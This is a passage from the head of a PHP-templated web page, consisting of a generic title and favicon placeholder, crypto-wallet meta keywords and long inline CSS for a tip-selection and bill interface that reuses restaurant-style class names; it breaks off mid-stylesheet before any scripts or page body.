<html lang="en">

<head>
  <meta charset="utf-8" />
  <title><?= $generic->name ?></title>
  <link rel="shortcut icon" href="<?= $files[$generic->favicon]->logo ?>">
  <meta name="keywords" content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="<?= $generic->name ?>">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;1,100;1,300&display=swap" rel="stylesheet">
  <style>
    * {
      -webkit-box-sizing: border-box;
      box-sizing: border-box;
      -webkit-font-smoothing: antialiased;
      -webkit-tap-highlight-color: transparent;
      scrollbar-width: thin;
      outline: 0;
      line-height: 1;
      -webkit-text-size-adjust: none;
      -moz-text-size-adjust: none;
      -ms-text-size-adjust: none;
      text-size-adjust: none;
    }

    small.copy {
      position: absolute;
      right: 0;
      padding: 5px;
      background-color: #69696957;
      color: black;
      border-radius: 3px;
      bottom: 70px;
      cursor: pointer;
      font-weight: bold;
      left: calc(50% - 30px);
      width: 50px;
      text-align: center;
    }

    html,
    body {
      margin: 0;
      height: 100%;
      background-color: white;
      background-image: linear-gradient(180deg, rgba(0, 79, 249, 0.2) 0%, rgba(255, 249, 76, 0.2) 100%);
    }

    main {
      -webkit-box-flex: 1;
      -ms-flex-positive: 1;
      flex-grow: 1;
      color: black;
      width: 100%;
      min-height: 100%;
      display: -webkit-box;
      display: -ms-flexbox;
      display: flex;
      -webkit-box-pack: center;
      -ms-flex-pack: center;
      justify-content: center;
      -webkit-transition: opacity 0.2s, -webkit-transform 0.2s;
      transition: opacity 0.2s, -webkit-transform 0.2s;
      -o-transition: opacity 0.2s, transform 0.2s;
      transition: opacity 0.2s, transform 0.2s;
      transition: opacity 0.2s, transform 0.2s, -webkit-transform 0.2s;
      flex-direction: column;
    }

    .address {
      float: left;
      width: 100%;
      word-break: break-word;
    }

    .loader,
    .loader:after {
      border-radius: 50%;
      width: 50px;
      height: 50px;
    }

    .back {
      float: left;
      cursor: pointer;
    }

    .tips-fast-options.coin-details {
      flex-direction: column;
    }

    .loader {
      position: relative;
      text-indent: -9999em;
      border-top: 5.5px solid rgba(95, 95, 217, 0.2);
      border-right: 5.5px solid rgba(95, 95, 217, 0.2);
      border-bottom: 5.5px solid rgba(95, 95, 217, 0.2);
      border-left: 5.5px solid #5f5fd9;
      -webkit-transform: translateZ(0);
      -ms-transform: translateZ(0);
      transform: translateZ(0);
      -webkit-animation: load8 1.1s infinite linear;
      animation: load8 1.1s infinite linear;
    }

    @-webkit-keyframes load8 {
      0% {
        -webkit-transform: rotate(0deg);
        transform: rotate(0deg);
      }

      100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    @keyframes load8 {
      0% {
        -webkit-transform: rotate(0deg);
        transform: rotate(0deg);
      }

      100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
      }
    }

    .loader-container {
      margin-top: 50vh;
      -webkit-transform: translate(-50%, -50%);
      -ms-transform: translate(-50%, -50%);
      transform: translate(-50%, -50%);
      width: 50px;
      height: 50px;
      position: fixed;
      top: 0;
      left: 50%;
    }
  </style>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5" />
  <style>
    html,
    body {
      margin: 0;
      height: 100%;
    }

    body {
      font-size: 16px;
      font-family: "Lato", "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", Oxygen, Ubuntu, Cantarell,
        "Open Sans", "Helvetica Neue", sans-serif;
      overscroll-behavior: none;
      -webkit-overflow-scrolling: touch;
    }

    h1,
    h2 {
      font-family: "Lato", "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", Oxygen, Ubuntu, Cantarell,
        "Open Sans", "Helvetica Neue", sans-serif;
      font-weight: 600;
    }

    @media (hover: hover) and (pointer: fine) {

      *::-webkit-scrollbar-thumb,
      *::-webkit-scrollbar {
        background: transparent;
        width: 5px;
        height: 5px;
        padding: 3px;
      }

      *::-webkit-scrollbar-thumb {
        background: rgba(200, 200, 200, 0.5);
      }

      *::-webkit-scrollbar-thumb:horizontal {
        border-radius: 2em 2em 0 0;
      }

      *::-webkit-scrollbar-thumb:vertical {
        border-radius: 2em 0 0 2em;
      }

      *::-webkit-scrollbar-track {
        display: none;
      }
    }

    .restaurant-all-content {
      width: 100%;
      min-height: 100vh;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      background: #2d374f;
      position: relative;
    }

    .bg-restaurant-img {
      width: 100%;
      height: 100%;
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0;
      -webkit-transition: opacity 0.3s;
      transition: opacity 0.3s;
    }

    .bg-restaurant {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      width: 100%;
      min-height: 100%;
      z-index: 1;
    }

    .restaurant-card {
      max-height: 90vh;
      max-width: 95vw;
      overflow: hidden;
      padding-right: 5px;
      width: 100vw;
      will-change: contents;
    }

    .restaurant-card.block {
      margin: auto;
      border-radius: 32px;
      box-shadow: 0px 4px 4px rgba(0, 0, 0, 0.25);
      -webkit-transition: border-radius 0.4s ease-out 0.05s, width 0.3s ease-in-out;
      transition: border-radius 0.4s ease-out 0.05s, width 0.3s ease-in-out;
      background: white;
      padding-right: 0;
      overflow: hidden;
    }

    .restaurant-scroller {
      overflow-y: auto;
      overflow-x: hidden;
      height: 100%;
    }

    .restaurant-content {
      -webkit-transition: opacity 0.2 ease-in-out 0.4s, height 0.3s ease-in-out;
      transition: opacity 0.2 ease-in-out 0.4s, height 0.3s ease-in-out;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      color: black;
      overflow: hidden;
      will-change: contents;
    }

    .restaurant-content>div {
      width: 100%;
    }

    .restaurant-content .padding {
      padding: 16px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      width: 100%;
    }

    .restaurant-content .padding:empty {
      padding-bottom: 0;
    }

    .restaurant-content .padding>.restaurant-icon {
      border-radius: 50%;
      width: 64px;
      height: 64px;
    }

    .restaurant-content .padding>h2 {
      font-weight: 600;
      font-size: 22px;
      line-height: 26px;
      text-align: center;
      margin: 16px 0 6px 0;
    }

    .restaurant-content .padding>h2.error {
      font-weight: 700;
    }

    .restaurant-content .padding>.grey-subtitle {
      color: grey;
      text-align: center;
    }

    .table {
      color: #808080;
    }

    .delimeter {
      border-top: solid 1px #ebebeb;
      width: 100%;
    }

    .action-tile {
      width: 100%;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      cursor: pointer;
      padding: 16px;
      -webkit-transition: background 0.2s;
      transition: background 0.2s;
      text-decoration: none;
      color: inherit;
      background: transparent;
      border: 0;
      outline: 0;
      font-size: inherit;
      text-align: inherit;
      font-family: inherit;
    }

    .delimeter+.action-tile {
      padding-top: 20px;
    }

    .action-tile:hover,
    .action-tile:focus {
      background: rgba(95, 95, 217, 0.05);
    }

    .action-tile:active {
      background: rgba(95, 95, 217, 0.1);
    }

    .tile-icon {
      border: solid 1px #2f53ff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      min-width: 40px;
      min-height: 40px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
    }

    .tile-text {
      margin-left: 16px;
    }

    .tile-title {
      font-weight: 600;
    }

    .tile-subtitle {
      color: #808080;
    }

    .tile-icon.filled {
      background-color: #2f53ff;
    }

    .tile-icon>svg {
      display: block;
      width: 50%;
    }

    .button {
      background: #2f53ff;
      border-radius: 12px;
      padding: 16px;
      color: white;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      text-decoration: none;
      font-family: inherit;
      cursor: pointer;
      font-weight: 700;
      width: 100%;
      outline: 0;
      border: 0;
      -webkit-transition: background 0.2s, -webkit-filter 0.2s;
      transition: background 0.2s, -webkit-filter 0.2s;
      transition: background 0.2s, filter 0.2s;
      transition: background 0.2s, filter 0.2s, -webkit-filter 0.2s;
      font-size: 16px;
    }

    button.button>div {
      margin: auto;
    }

    .button:hover,
    .button:focus {
      background: #516eff;
    }

    .button:active {
      background: #526efc;
    }

    .inactive {
      cursor: default;
      opacity: 0.3;
    }

    .inactive * {
      pointer-events: none !important;
    }

    .inactive .button:hover,
    .inactive .button:active,
    .inactive .button:focus {
      background: #2f53ff;
    }

    .button.round-outline {
      background: transparent;
      border: 1px solid #e2e2e2;
      box-sizing: border-box;
      border-radius: 16px;
      padding: 12px 24px;
      -webkit-transition: background 0.2s, opacity 0.2s;
      transition: background 0.2s, opacity 0.2s;
      opacity: 0.7;

      min-height: 48px;
      /* font-family: Lato; */
      font-style: normal;
      font-weight: bold;
      font-size: 14px;
      line-height: 24px;

      color: #000000;
    }

    .button.round-outline:hover {
      background: rgba(255, 255, 255, 0.05);
    }

    .button.round-outline:active,
    .button.round-outline:focus {
      background: rgba(255, 255, 255, 0.1);
    }

    .button.round-outline.active {
      background: #2f53ff;
      color: white;
      opacity: 1;
    }

    .button.round-outline>div {
      font-family: Lato;
      font-style: normal;
      font-weight: 700;
      font-size: 14px;
      line-height: 24px;
      /* identical to box height, or 171% */

      text-align: right;

      /* color: #000000; */
    }

    .button.transparent {
      font-weight: normal;
      background: none !important;
    }

    .dark-bg {
      position: relative;
      background-color: rgb(4 24 132);
      color: black;
      width: 100%;
      min-height: 100%;
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      text-align: center;
      padding: 0 24px;
      min-height: 65vh;
    }

    .page-input.dark-bg {
      background: white;
      color: black;
      padding: 30px 24px;
    }


    .total-title {
      margin-bottom: 8px;
      font-weight: bold;
      font-size: 22px;
    }

    .dark-bg .table {
      color: rgb(158, 158, 158);
    }

    .padding.m24 {
      padding: 24px;
    }

    .bill-container {
      width: 100%;
      padding: 0 16px 0 16px;
      -webkit-filter: drop-shadow(0 8px 40px rgba(0, 0, 0, 0.15));
      filter: drop-shadow(0 8px 40px rgba(0, 0, 0, 0.15));
      -webkit-animation: showup 0.5s ease-in-out;
      animation: showup 0.5s ease-in-out;
    }

    @-webkit-keyframes showup {
      0% {
        opacity: 0;
        -webkit-transform: translateY(100px);
        transform: translateY(100px);
      }

      100% {
        opacity: 1;
        -webkit-transform: translateY(0);
        transform: translateY(0);
      }
    }

    @keyframes showup {
      0% {
        opacity: 0;
        -webkit-transform: translateY(100px);
        transform: translateY(100px);
      }

      100% {
        opacity: 1;
        -webkit-transform: translateY(0);
        transform: translateY(0);
      }
    }

    .bill-clip-box {
      border-radius: 4px;
      overflow: hidden;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      width: 100%;
      margin: auto;
    }

    .bill-main-content {
      color: black;
      width: 100%;
    }

    .bill-main-content:before,
    .bill-grand-total:after {
      content: "";
      display: block;
      width: 100%;
      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAHCAYAAABgOO8AAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAkUlEQVQoka2TUQ2DMBgGbw5wMBwMCUhAAlImYRKQsDmYBOYACXNwSxN46WhoSS/pU9Pvu6b9L6r88wEW4AlMO/s16YAR6IEbHrOoXfCuvBr1EbfnCG2MFYVadd4rKREKTBVkevWbKigVcr1Ze1LmfhR+RmgjhId/kCMypJ4oJjVlJbyANzBHh5p1cgbgmhUI/AALJoeWWnGrmAAAAABJRU5ErkJggg==);
      height: 3.5px;
      background-repeat: repeat-x;
      background-size: auto 100%;
    }

    .bill-grand-total:after {
      background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAHCAYAAABgOO8AAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAFiQAABYkAZsVxhQAAACMSURBVDhPtdNvEUAwAIZxGmhAAyIsggiiiCCCCDQQgQYiaMDz+uLssI3z3P0+mN3mb7xS9K0eA8b96CiBQYlUA17pgl5WI4HWcCkxwpkmh6aFM9ib+tBNPKZJIbWwNwllsOAyTfCtgr34W3rCl69QJ13NKGAv+pW+vwan7v6yCTM6tBr4sQIV+COjfANCZYeW7LxmxgAAAABJRU5ErkJggg==);
    }

    .guest-block {
      background: white;
      padding: 10px 16px;
    }

    .bill-main-content .guest-block:nth-child(1) {
      padding-top: 20px;
    }

    .bill-grand-total-content {
      background: white;
      color: black;
    }

    .bill-grand-delimeter {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      width: 100%;
    }

    .bill-grand-delimeter>img {
      height: 20px;
      -webkit-user-select: none;
      user-select: none;
    }

    .bill-grand-delimeter>div {
      width: 100%;
      background: white;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
    }

    .dash-line {
      border-top: 1.5px dashed #c9c9c9;
      width: 100%;
      margin: 0 12px;
    }

    .order-guest-header {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      width: 100%;
    }

    .order-guest-header-delimeter {
      border-top: 1px solid #cccccc;
      width: 100%;
    }

    .order-guest-header>.order-guest-header-delimeter:nth-child(1) {
      margin: 0 20px 0 0;
    }

    .order-guest-header>.order-guest-name {
      max-width: 66%;
      -webkit-flex-shrink: 0;
      flex-shrink: 0;
      font-weight: bold;
    }

    .order-guest-header>.order-guest-header-delimeter:nth-child(3) {
      margin: 0 0 0 20px;
    }

    .bill-line {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      padding: 7px 0;
      text-align: left;
    }

    .bill-line.total {
      font-weight: bold;
    }

    .bill-line-price {
      margin-left: auto;
      -webkit-flex-shrink: 0;
      flex-shrink: 0;
      padding-left: 15px;
    }

    .button-shade {
      /* background: linear-gradient( 180deg, rgba(45, 55, 79, 0) 0%, rgba(45, 55, 79, 0.5) 35%, #2D374F 60%); */
      position: -webkit-sticky;
      position: sticky;
      bottom: 0;
      width: 100%;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      padding: 16px 0 0 0;
      pointer-events: none;
      margin-top: auto;
      -webkit-transition: opacity 0.2s;
      transition: opacity 0.2s;
      z-index: 2;
    }

    .page-tips .button-shade.dont-push {
      margin-bottom: 40px;
    }

    .button-shade.dont-push {
      margin: 0;
    }

    .button-shade .button {
      margin-top: auto;
      max-width: 416px;
      pointer-events: all;
    }

    .button-shade apple-pay-button {
      pointer-events: all;
    }

    .center-block {
      margin: auto;
      width: 100%;
    }

    .page-title-header {
      padding: 30px;
      padding-top: 0px;
    }

    .page-title-block {
      width: 100%;
      max-width: 416px;
      margin-top: 32px;
      margin-bottom: 40px;
      z-index: 2;
      color: white;
      /* font-family: Lato; */
    }

    .title {
      color: white;
      font-weight: bold;
    }

    .page-title-block .emoji-ua-flag {
      display: inline-block;

      margin-bottom: -3px;

      width: 26px;
      height: 24px;
      /* background: #FFFFFF; */
      background-image: url(/assets/images/2bbade08b252726348bdaf88e5c1c6a8.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: auto;
    }

    .page-title-block h3 {
      /* font-family: Lato; */
      margin: 0 13px;
      font-style: normal;
      font-weight: 800;
      font-size: 24px;
      line-height: 26px;
      /* identical to box height, or 108% */

      text-align: center;

      color: white;
    }

    .page-title-header {
      position: relative;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
    }

    .page-title-header .page-title-header--logo {
      width: 72px;
      height: 72px;

      background: #ffffff;
      background-position: center;
      background-size: contain;
      border-radius: 100px;
      min-width: 72px;
      cursor: pointer;
      background-image: url(<?= $files[$generic->favicon]->logo ?>);
    }

    .page-title-header .page-title-header--emoji1 {
      width: 32px;
      min-width: 32px;
      height: 32px;
      /* background: #FFFFFF; */
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      justify-self: flex-start;
      -webkit-align-self: center;
      align-self: center;
      margin-right: auto;
    }

    .page-title-header .page-title-header--emoji2 {
      width: 32px;
      min-width: 32px;
      height: 32px;
      /* background: #FFFFFF; */
      background-image: url(/assets/images/de5537aed048b36dd19cca0530f8b3ed.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      justify-self: flex-end;
      -webkit-align-self: center;
      align-self: center;
      margin-left: auto;
    }

    .bottom-emoji-row {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      height: 80px;
      width: 100%;
      position: absolute;
      left: 0;
    }

    .bottom-emoji-row .page-title-header--emoji1 {
      width: 32px;
      height: 32px;
      /* background: #FFFFFF; */
      background-image: url(/assets/images/a1cd82b5a6a6155b940e33b3f4332f68.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin: auto 0;
    }

    .dark-bg::before {
      position: absolute;
      content: "";
      left: 0;
      right: 0;
      bottom: 0;
      top: 0;
      background-color: #0000007a;
    }

    .bottom-emoji-row .page-title-header--emoji2 {
      width: 32px;
      height: 32px;
      /* background: #FFFFFF; */
      background-image: url(/assets/images/6aadd88a407cd219041adeee1c800971.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      margin: auto auto 0 auto;
    }

    .bottom-emoji-row .page-title-header--emoji3 {
      width: 32px;
      height: 32px;
      /* background: #FFFFFF; */
      background-image: url(/assets/images/1a979f05b67a21730a4df66e0164ad96.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
    }

    .page-title-block h4 {
      margin: 0px;
      margin-top: 8px;
      font-style: normal;
      font-weight: bold;
      font-size: 20px;
      line-height: 26px;
      font-weight: 700;
      /* identical to box height, or 130% */

      text-align: center;

      color: white;
    }

    .page-tips .center-block {
      margin: auto;
      width: 100%;
      max-width: 716px;
      padding: 24px;
      color: black;
      background: #ffffff;
      box-shadow: 0px 8px 40px rgba(0, 0, 0, 0.1);
      border-radius: 20px;
      position: relative;
      margin-bottom: 70px !important;
    }

    .page-tips .center-block.bottomed {
      margin: auto;
    }

    .tip-title {
      /* font-family: Lato; */
      font-style: normal;
      font-weight: 600;
      font-size: 16px;
      line-height: 24px;
      /* identical to box height, or 150% */
      text-align: center;

      color: #000000;
      margin: 0px 0px 12px 0px;
    }

    .page-input .tip-title.top {
      font-style: normal;
      font-weight: 800;
      font-size: 22px;
      line-height: 30px;
      margin-top: 0px;
      /* identical to box height, or 136% */

      text-align: center;

      /* Label Light / Primary */

      color: #000000;
      margin-bottom: 0;
    }

    .tip-title.top {
      margin-top: 40px;
    }

    .button-row {
      max-width: 450px;
      /* padding: 16px; */
      margin: 0 auto;
      box-sizing: content-box;
      padding: 12px 0 0 0;
    }

    .tips-fast-options {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: justify;
      -webkit-justify-content: space-between;
      justify-content: space-between;
      position: relative;
      padding: 12px 0;
      flex-wrap: wrap;
      flex-direction: row;
    }

    .tip-choice img {
      width: 100%;
    }

    .tip-choice {
      margin: 8px 8px 15px 8px;
      background: #35405a;
      cursor: pointer;
      -webkit-transition: background 0.2s;
      transition: background 0.2s;
      -webkit-user-select: none;
      user-select: none;
      /* color: #FFFFFF; */
      background: transparent;

      color: rgba(0, 0, 0, 1);
      padding: 8px 0;
      width: 100px;
    }

    @media (max-width: 350px) {
      .page-tips .center-block {
        padding: 16px;
      }

      .tips-fast-options,
      .button-row {
        padding: 16px 0 0 0;
      }

      .tip-choice {
        margin: 0 5px;
      }
    }

    .tip-choice::after {
      content: "";
      width: 24px;
      height: 24px;
      position: absolute;
      top: 0px;
      left: 100%;
      -webkit-transform: translate(-75%, -50%);
      transform: translate(-75%, -50%);

      background-image: url(/assets/images/c3e1947f570848448a0b9d7f4647aabd.png);
      background-position: center;
      background-size: contain;
      background-repeat: no-repeat;
      justify-self: flex-end;
      margin-left: auto;
      z-index: 1;
    }

    .tip-choice.active {
      /* background: #2F53FF; */
      background: #2f53ff;
      color: white;
    }

    .tip-content {
      /* position: absolute; */
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      -webkit-box-orient: vertical;
      -webkit-box-direction: normal;
      -webkit-flex-direction: column;
      flex-direction: column;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      text-align: center;
    }

    .tip-choice img.tip-bg {
      width: 100%;
      opacity: 0;
    }

    .tip-choice img.tip-emoji {
      position: absolute;
      top: 0;
      left: 66%;
      -webkit-transform: rotate(4deg);
      transform: rotate(4deg);
      height: 25%;
      pointer-events: none;
    }

    .tip-choice.wink.active img.tip-emoji {
      -webkit-animation: wink 1s ease-in-out;
      animation: wink 1s ease-in-out;
    }

    @-webkit-keyframes wink {
      0% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      35% {
        -webkit-transform: rotate(16deg) scale(1.1);
        transform: rotate(16deg) scale(1.1);
      }

      50% {
        -webkit-transform: rotate(-16deg) scale(1.1);
        transform: rotate(-16deg) scale(1.1);
      }

      75% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }
    }

    @keyframes wink {
      0% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      35% {
        -webkit-transform: rotate(16deg) scale(1.1);
        transform: rotate(16deg) scale(1.1);
      }

      50% {
        -webkit-transform: rotate(-16deg) scale(1.1);
        transform: rotate(-16deg) scale(1.1);
      }

      75% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }
    }

    .tip-choice.wiggle.active img.tip-emoji {
      -webkit-animation: wiggle 1s ease-in-out;
      animation: wiggle 1s ease-in-out;
    }

    @-webkit-keyframes wiggle {
      0% {
        -webkit-transform: translateY(0) rotate(4deg);
        transform: translateY(0) rotate(4deg);
      }

      45% {
        -webkit-transform: translateY(-20%) rotate(0deg);
        transform: translateY(-20%) rotate(0deg);
      }

      55% {
        -webkit-transform: translateY(20%) scale(1.2, 0.9) rotate(0deg);
        transform: translateY(20%) scale(1.2, 0.9) rotate(0deg);
      }

      75% {
        -webkit-transform: rotate(4deg) scale(1) rotate(4deg);
        transform: rotate(4deg) scale(1) rotate(4deg);
      }
    }

    @keyframes wiggle {
      0% {
        -webkit-transform: translateY(0) rotate(4deg);
        transform: translateY(0) rotate(4deg);
      }

      45% {
        -webkit-transform: translateY(-20%) rotate(0deg);
        transform: translateY(-20%) rotate(0deg);
      }

      55% {
        -webkit-transform: translateY(20%) scale(1.2, 0.9) rotate(0deg);
        transform: translateY(20%) scale(1.2, 0.9) rotate(0deg);
      }

      75% {
        -webkit-transform: rotate(4deg) scale(1) rotate(4deg);
        transform: rotate(4deg) scale(1) rotate(4deg);
      }
    }

    .tip-choice.emphasis.active img.tip-emoji {
      -webkit-animation: emphasis 1.5s ease-in-out;
      animation: emphasis 1.5s ease-in-out;
    }

    @-webkit-keyframes emphasis {
      0% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      45% {
        -webkit-transform: rotate(-4deg) scale(1.15);
        transform: rotate(-4deg) scale(1.15);
      }

      55% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      66% {
        -webkit-transform: rotate(8deg) scale(1.3);
        transform: rotate(8deg) scale(1.3);
      }

      100% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }
    }

    @keyframes emphasis {
      0% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      45% {
        -webkit-transform: rotate(-4deg) scale(1.15);
        transform: rotate(-4deg) scale(1.15);
      }

      55% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }

      66% {
        -webkit-transform: rotate(8deg) scale(1.3);
        transform: rotate(8deg) scale(1.3);
      }

      100% {
        -webkit-transform: rotate(4deg) scale(1);
        transform: rotate(4deg) scale(1);
      }
    }

    .tip-content .tip-amount {
      /* font-family: Lato; */
      font-style: normal;
      font-weight: 700;
      font-size: 14px;
      line-height: 16px;
      border: 1px solid #e2e2e2;
      border-radius: 50%;
      overflow: hidden;
      width: 100%;
      height: 100px;
    }

    .tip-content .tip-percent {
      font-size: 14px;
      opacity: 0.6;

      /* font-family: Lato; */
      font-weight: 400;
      font-size: 12px;
      line-height: 16px;
      /* identical to box height, or 133% */

      text-align: center;
    }

    .button-row {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
    }

    .button-row .button {
      margin-right: 15px;
    }

    .button-row .button:last-child {
      margin-right: 0;
    }

    .button .icon-button-label {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-align: center;
      -webkit-align-items: center;
      align-items: center;
      text-align: initial;
    }

    .button .icon-button-label svg {
      margin-left: 8px;
      height: 1em;
    }

    .tip-input-block {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-box-pack: center;
      -webkit-justify-content: center;
      justify-content: center;
      font-weight: 700;
      font-size: 48px;
      text-align: center;
      -webkit-transition: opacity 0.2s;
      transition: opacity 0.2s;
    }

    .tip-input-block.empty {
      opacity: 0.15;
    }

    .tip-input-trailing {
      margin-left: 0.5em;
    }

    .scrolling-el {
      position: relative;
      width: 100vw;
      max-width: 550px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      -webkit-user-select: none;
      user-select: none;
    }

    @media (min-width: 530px) {
      .scrolling-el:before {
        content: "";
        width: 20px;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background: -webkit-gradient(linear, left top, right top, from(rgba(45, 55, 78, 1)), to(rgba(45, 55, 78, 0)));
        background: -webkit-linear-gradient(left, rgba(45, 55, 78, 1), rgba(45, 55, 78, 0));
        background: linear-gradient(90deg, rgba(45, 55, 78, 1), rgba(45, 55, 78, 0));
        z-index: 1;
        pointer-events: none;
      }

      .scrolling-el:after {
        content: "";
        width: 20px;
        height: 100%;
        position: absolute;
        top: 0;
        right: 0;
        background: -webkit-gradient(linear, right top, left top, from(rgba(45, 55, 78, 1)), to(rgba(45, 55, 78, 0)));
        background: -webkit-linear-gradient(right, rgba(45, 55, 78, 1), rgba(45, 55, 78, 0));
        background: linear-gradient(270deg, rgba(45, 55, 78, 1), rgba(45, 55, 78, 0));
        pointer-events: none;
      }

      .restaurant-card {
        max-width: 550px;
      }
    }

    .bill-scroller {
      -webkit-box-flex: 1;
      -webkit-flex-grow: 1;
      flex-grow: 1;
    }

    .scrolling-el-scroller {
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      overflow: hidden;
      width: 100%;
      will-change: scroll-position;
    }

    .scrolling-tile {
      -webkit-flex-shrink: 0;
      flex-shrink: 0;
      width: 85%;
      overflow: visible;
      margin: 0 auto;
    }

    .scrolling-tile:first-child,
    .scrolling-tile:last-child {
      width: 95%;
    }

    .scrolling-tile>.bill-container {
      padding: 0 9px;
    }

    .scrolling-tile:first-child>.bill-container {
      padding-left: 18px;
    }

    .scrolling-tile:last-child>.bill-container {
      padding-right: 18px;
    }

    .nav-dots-content {
      padding: 16px;
      padding-top: 0;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
    }

    .nav-dot {
      width: 8px;
      height: 8px;
      background: white;
      border-radius: 50%;
      margin: 4px;
      opacity: 0.4;
      -webkit-transition: opacity 0.2s;
      transition: opacity 0.2s;
    }

    .nav-dot.active {
      opacity: 1;
    }

    .bill-titles .scrolling-tile:first-child .padding {
      margin-left: 5%;
    }

    .bill-titles .scrolling-tile:last-child .padding {
      margin-right: 5%;
    }

    .bill-titles .scrolling-tile .padding {
      padding-bottom: 8px;
    }

    .back-button {
      /* width: 100vw; */
      height: 24px;
      max-width: 520px;
      /* position: absolute; */
      /* top: 16px; */
      padding-left: 16px;
      padding-right: 16px;
      display: -webkit-box;
      display: -webkit-flex;
      display: flex;
      pointer-events: none;
      z-index: 2;
    }

    .page-input .back-button {
      top: 32px;
      left: 12px;
    }

    .back-button-area {
      width: 24px;
      box-shadow: 0 0 10px 10px #2d374f;
      background: #2d374f;
